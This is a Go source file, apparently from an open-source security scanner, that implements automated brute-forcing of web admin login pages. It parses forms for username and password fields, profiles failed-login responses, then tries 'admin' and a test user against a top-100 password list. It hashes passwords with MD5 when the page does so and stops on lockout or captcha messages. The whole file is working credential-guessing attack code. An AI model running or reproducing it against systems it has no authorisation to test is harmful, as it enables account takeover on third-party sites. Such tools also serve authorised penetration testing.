package brute

import (
	"crypto/md5"
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"net/url"
	"regexp"
	"strings"
	"time"
)

var SkipAdminBrute bool

var UserReg = regexp.MustCompile(`(?i)<input.*?(?:name|id)=['"]([^'"]*(?:name|user|uid|login|mail|log|account)[^'"]*).*?>`)
var PswdReg = regexp.MustCompile(`(?i)<input.*?(?:name|id)=['"]([^'"]*(?:pass|pwd|word|mima|password|mm)[^'"]*).*?>`)
var actionReg = regexp.MustCompile(`<form.*?action=['"](.*?)['"]`)
var locationReg = regexp.MustCompile(`location.href=['"](.*?)['"]`)
var r009 = regexp.MustCompile(`url.*?:.*?['"](.*?)['"],`)

/*
loginMailbox
loginPassword
*/
func getinput(inputurl string) (usernamekey string, passwordkey string, loginurl string, ismd5 bool) {
	usernamekey = "username"
	passwordkey = "password"
	if req, err := util.HttpRequset(inputurl, "GET", "", true, nil); err == nil {
		if util.StrContains(req.Body, "md5.js") {
			ismd5 = true
		}
		u, err := url.Parse(strings.TrimSpace(req.RequestUrl))
		if err != nil {
			return "", "", "", false
		}
		loginurl = u.String()
		if u.Path == "/" {
			loginurl = loginurl + "login"
		} else if u.Path == "" {
			loginurl = loginurl + "/login"
		}
		hreflist := locationReg.FindStringSubmatch(req.Body)
		if hreflist != nil {
			href, _ := url.Parse(strings.TrimSpace(hreflist[len(hreflist)-1:][0]))
			hrefurl := u.ResolveReference(href)
			req, err = util.HttpRequset(hrefurl.String(), "GET", "", true, nil)
			if err != nil {
				return "", "", "", false
			}
		}
		usernamelist := UserReg.FindStringSubmatch(req.Body)
		if usernamelist != nil && 2 <= len(usernamelist) {
			usernamekey = usernamelist[len(usernamelist)-1:][0]
		}
		passlist := PswdReg.FindStringSubmatch(req.Body)
		if passlist != nil {
			passwordkey = passlist[len(passlist)-1:][0]
		}
		domainlist := actionReg.FindStringSubmatch(req.Body)
		if domainlist != nil {
			if action, err := url.Parse(strings.TrimSpace(domainlist[len(domainlist)-1:][0])); err == nil {
				loginurl = u.ResolveReference(action).String()
			}
		} else {
			domainlist2 := r009.FindStringSubmatch(req.Body)
			if domainlist2 != nil {
				if ajax, err := url.Parse(strings.TrimSpace(domainlist2[len(domainlist2)-1:][0])); err == nil {
					loginurl = u.ResolveReference(ajax).String()
				}
			} else if strings.HasSuffix(inputurl, ".jsp") || strings.HasSuffix(inputurl, ".do") {
				u01, _ := url.Parse("/login.do")
				loginurl = u.ResolveReference(u01).String()
			}
		}
	}
	return usernamekey, passwordkey, loginurl, ismd5
}

var LocationReg = regexp.MustCompile(`(.*?);`)

// 登陆页面密码爆破
func Admin_brute(u string) (username string, password string, loginurl string) {
	if util.TestRepeat(u) {
		return
	}
	if SkipAdminBrute {
		return "", "", ""
	}
	usernamekey, passwordkey, loginurl, ismd5 := getinput(u)
	var (
		adminfalsedata        = fmt.Sprintf("%s=admin&%s=Qweasd123admin", usernamekey, passwordkey)
		testfalsedata         = fmt.Sprintf("%s=testnmanp&%s=Qweasd123test", usernamekey, passwordkey)
		adminaccount          = true
		testaccount           = true
		usernames             []string
		noaccount             = []string{"不存在", "用户名错误", "\\u4e0d\\u5b58\\u5728", "\\u7528\\u6237\\u540d\\u9519\\u8bef"}
		lockContent           = []string{"认证失败", "账号或密码错误", "锁定", "次数超", "超次数", "验证码错误", "请输入验证码", "请输入正确的验证码", "验证码不能为空", "\\u9501\\u5b9a", "\\u6b21\\u6570\\u8d85", "\\u8d85\\u6b21\\u6570", "\\u9a8c\\u8bc1\\u7801\\u9519\\u8bef", "\\u8bf7\\u8f93\\u5165\\u9a8c\\u8bc1\\u7801", "\\u8bf7\\u8f93\\u5165\\u6b63\\u786e\\u7684\\u9a8c\\u8bc1\\u7801", "\\u9a8c\\u8bc1\\u7801\\u4e0d\\u80fd\\u4e3a\\u7a7a"}
		adminfalseContentlen  int
		testfalseContentlen   int
		falseis302            = false
		falseis401            = false
		falseis500            = false
		falseis200            = false
		adminfalse302location string
		testfalse302location  string
	)
	if adminfalseurl, err := util.HttpRequset(loginurl, "POST", adminfalsedata, false, nil); err == nil {
		code := adminfalseurl.StatusCode
		switch code {
		case 301, 302, 307, 308:
			falseis302 = true
			if strings.Contains(adminfalseurl.Location, ";") {
				adminfalseurl.Location = LocationReg.FindString(adminfalseurl.Location)
			}
			adminfalse302location = adminfalseurl.Location
		case 401:
			falseis401 = true
		case 200:
			if util.SliceInString(adminfalseurl.Body, noaccount) {
				adminaccount = false
			}
			falseis200 = true
			adminfalseContentlen = adminfalseurl.ContentLength
		default:
			falseis500 = true
			time.Sleep(3 * time.Millisecond)
		}
	} else {
		falseis500 = true
	}

	if testfalseurl, err := util.HttpRequset(loginurl, "POST", testfalsedata, false, nil); err == nil {
		code := testfalseurl.StatusCode
		switch code {
		case 301, 302, 307, 308:
			falseis302 = true
			if strings.Contains(testfalseurl.Location, ";") {
				testfalseurl.Location = LocationReg.FindString(testfalseurl.Location)
			}
			testfalse302location = testfalseurl.Location
		case 401:
			falseis401 = true
		case 200:
			if util.SliceInString(testfalseurl.Body, noaccount) {
				testaccount = false
			}
			falseis200 = true
			testfalseContentlen = testfalseurl.ContentLength
		default:
			falseis500 = true
			time.Sleep(3 * time.Millisecond)
		}
	} else {
		falseis500 = true
	}
	if adminaccount {
		usernames = append(usernames, "admin")
	}
	if testaccount {
		usernames = append(usernames, "testnmanp")
	}
	if !adminaccount && !testaccount {
		falseis500 = true
	}
	if falseis200 && adminfalseContentlen == 0 && testfalseContentlen == 0 {
		falseis500 = true
	}
	if falseis500 {
		return "", "", ""
	}
	for _, user := range usernames {
		for _, pass := range top100pass {
			if ismd5 {
				data := []byte(pass)
				has := md5.Sum(data)
				pass = fmt.Sprintf("%x", has)
			}
			pay := fmt.Sprintf("%s=%s&%s=%s", usernamekey, user, passwordkey, pass)
			if req, err2 := util.HttpRequset(loginurl, "POST", pay, false, nil); err2 == nil {
				if falseis401 {
					if req.StatusCode != 401 {
						util.SendLog(loginurl, "admin_brute", fmt.Sprintf("Found vuln admin password|%s:%s|%s\n", user, pass, loginurl), pay)
						return user, pass, loginurl
					}
				}
				if falseis302 {
					if strings.Contains(req.Location, ";") {
						req.Location = LocationReg.FindString(req.Location)
					}
					if req.Location != adminfalse302location && req.Location != testfalse302location {
						sucesstestdata := fmt.Sprintf("%s=%s&%s=Qweasd123zxc", usernamekey, user, passwordkey)
						if sucesstest, err := util.HttpRequset(loginurl, "POST", sucesstestdata, false, nil); err == nil {
							if sucesstest.Location != req.Location {
								util.SendLog(loginurl, "admin_brute", fmt.Sprintf("Found vuln admin password|%s:%s|%s\n", user, pass, loginurl), sucesstestdata)
								return user, pass, loginurl
							}
						}
					}
				}
				if falseis200 {
					if util.SliceInString(req.Body, lockContent) {
						return "", "", ""
					}
					adminlenabs := req.ContentLength - adminfalseContentlen
					testlenabs := req.ContentLength - testfalseContentlen
					if adminlenabs < 0 {
						adminlenabs = -adminlenabs
					}
					if testlenabs < 0 {
						testlenabs = -testlenabs
					}
					if (req.ContentLength != 0 || req.StatusCode == 301 || req.StatusCode == 302 || req.StatusCode == 307 || req.StatusCode == 308) && adminlenabs > 2 && testlenabs > 2 {
						sucesstestdata := fmt.Sprintf("%s=%s&%s=Qweasd123zxc", usernamekey, user, passwordkey)
						if sucesstest, err := util.HttpRequset(loginurl, "POST", sucesstestdata, false, nil); err == nil {
							if sucesstest.ContentLength != req.ContentLength {
								util.SendLog(loginurl, "admin_brute", fmt.Sprintf("Found vuln admin password|%s:%s|%s\n", user, pass, loginurl), sucesstestdata)
								return user, pass, loginurl
							}
						}
					}
				}
			}
		}
	}
	return "", "", ""
}

func init() {
	util.RegInitFunc(func() {
		SkipAdminBrute = util.GetValAsBool("SkipAdminBrute")
	})
}
